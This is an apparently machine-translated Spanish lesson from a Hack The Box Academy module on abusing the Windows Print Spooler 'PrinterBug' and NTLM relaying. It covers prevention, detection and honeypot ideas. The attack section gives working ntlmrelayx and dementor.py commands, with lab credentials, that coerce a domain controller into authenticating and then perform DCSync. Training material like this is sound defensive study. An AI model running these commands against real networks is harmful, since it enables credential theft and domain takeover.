# Print Spooler & NTLM Relaying

# **Descripción**

El[Bacher de impresión](https://learn.microsoft.com/en-us/windows/win32/printdocs/print-spooler)es un servicio antiguo habilitado de forma predeterminada, incluso con las últimas versiones de escritorio y servidores de Windows. El servicio se convirtió en un vector de ataque popular cuando en 2018,`Lee Christensen`encontró el`PrinterBug`. Las funciones[RpcremotefindFirstprinterChangenotificación](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83)y[RpcremoteFindFirstprinterChangeNotificationEx](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)Se puede abusar para obligar a una máquina remota a realizar una conexión a cualquier otra máquina a la que pueda alcanzar. Además, el`reverse`La conexión llevará información de autenticación como un`TGT`. Por lo tanto, cualquier usuario de dominio puede coaccionar`RemoteServer$`Para autenticarse en cualquier máquina. La postura de Microsoft en el`PrinterBug`era que no se solucionará, ya que el problema es "de diseño".

El impacto de`PrinterBug`es que cualquier controlador de dominio que tenga el bote de impresión habilitado puede verse comprometido de una de las siguientes maneras:

1. Transmitir la conexión a otro DC y realizar DCSYNC (si`SMB Signing`está deshabilitado).
2. Obligar al controlador de dominio a conectarse a una máquina configurada para`Unconstrained Delegation` (`UD`) - Esto almacenará en caché el TGT en la memoria del servidor UD, que se puede capturar/exportar con herramientas como`Rubeus`y`Mimikatz`.
3. Transmitir la conexión a`Active Directory Certificate Services`Para obtener un certificado para el controlador de dominio. Los agentes de amenaza pueden usar el certificado a pedido para autenticar y fingir ser el controlador de dominio (por ejemplo, DCSYNC).
4. Transmitir la conexión a configurar`Resource-Based Kerberos Delegation`para la máquina de retransmisión. Luego podemos abusar de la delegación para autenticarse como cualquier administrador de esa máquina.

---

# **Ataque**

En este camino de ataque, transmitiremos la conexión a otro DC y realizaremos`DCSync`(es decir, la primera técnica de compromiso enumerada). Para que el ataque tenga éxito, la firma de SMB en los controladores de dominio debe ser apagado.

Para comenzar, configuraremos`NTLMRelayx`Para reenviar cualquier conexión a DC2 e intentar realizar el ataque DCSYNC:

```
[!bash!]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2supportImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections

```

![](https://academy.hackthebox.com/storage/modules/176/A10/startntlmrelayx.png)

A continuación, necesitamos activar el`PrinterBug`Usando la caja Kali con`NTLMRelayx`escuchando. Para activar la conexión, usaremos[Demente](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py)(Cuando se ejecuta desde una máquina sin dominio unida, se requieren credenciales de usuario autenticado, y en este caso, supusimos que previamente habíamos comprometido a Bob):

```
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123

[*] connecting to 172.16.18.3
[*] bound to spoolss
[*] getting context handle...
[*] sending RFFPCNEX...
[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
[*] done!

```

![](https://academy.hackthebox.com/storage/modules/176/A10/dementor.png)

Ahora, volviendo a la sesión de la terminal con`NTLMRelayx`, veremos que DCSYNC fue exitoso:

![](https://academy.hackthebox.com/storage/modules/176/A10/hashes.png)

---

# **Prevención**

Impresión se debe deshabilitar en todos los servidores que no son servidores de impresión. Los controladores de dominio y otros servidores centrales nunca deben tener roles/funcionalidades adicionales que abran y amplíen la superficie de ataque hacia la infraestructura AD del núcleo.

Además, hay una opción para prevenir el abuso de la`PrinterBug`mientras mantiene el servicio en funcionamiento: al deshabilitar la clave de registro`RegisterSpoolerRemoteRpcEndPoint`, se bloquean cualquier solicitud remota entrante; Esto actúa como si el servicio estuviera deshabilitado para clientes remotos. Configurar la clave de registro en 1 lo habilita, mientras que 2 la deshabilita:

![](https://academy.hackthebox.com/storage/modules/176/A10/registry.png)

---

# **Detección**

Explotando el`PrinterBug`dejará rastros de conexiones de red hacia el controlador de dominio; Sin embargo, son demasiado genéricos para ser utilizados como mecanismo de detección.

En el caso de usar`NTLMRelayx`Para realizar DCSYNC, sin identificación de eventos`4662`se genera (como se menciona en la sección DCSYNC); Sin embargo, para obtener los hash como DC1 de DC2, habrá un evento de inicio de sesión exitoso para DC1. Este evento se origina en la dirección IP de la máquina Kali, no del controlador de dominio, como podemos ver a continuación:

![](https://academy.hackthebox.com/storage/modules/176/A10/detectDCSync.png)

Un mecanismo de detección adecuado siempre correlaciona todos los intentos de inicio de los servidores de infraestructura central a sus respectivas direcciones IP (que deben ser estáticas y conocidas).

---

# **Mielero**

Es posible usar el`PrinterBug`como medio para alertar sobre el comportamiento sospechoso en el medio ambiente. En este escenario, bloquearíamos las conexiones salientes de nuestros servidores a puertos`139`y`445`; El software o los firewalls físicos pueden lograr esto. Aunque el abuso puede desencadenar el error, las reglas del firewall no permitirán la conexión inversa para llegar al agente de amenazas. Sin embargo, esas conexiones bloqueadas actuarán como signos de compromiso para el equipo azul. Antes de hacer cumplir cualquier cosa relacionada con esta exploit, debemos asegurarnos de tener suficientes registros y conocimiento de nuestro entorno para garantizar que se permitan conexiones legítimas (por ejemplo, debemos mantener los puertos mencionados abiertos entre DC, para que puedan replicar los datos).

Si bien esto puede parecer adecuado para un honeypot para engañar a los adversarios, debemos tener cuidado antes de implementarlo, como actualmente, el error requiere que la máquina se conecte a nosotros, pero si se descubre un nuevo error desconocido, lo que permite algún tipo de control remoto Ejecución de código sin la conexión inversa, entonces esto nos hará contraproductos. Por lo tanto, solo debemos considerar esta opción si somos una organización extremadamente madura y podemos actuar de inmediato en alertas y deshabilitar el servicio en todos los dispositivos si se descubre un nuevo error.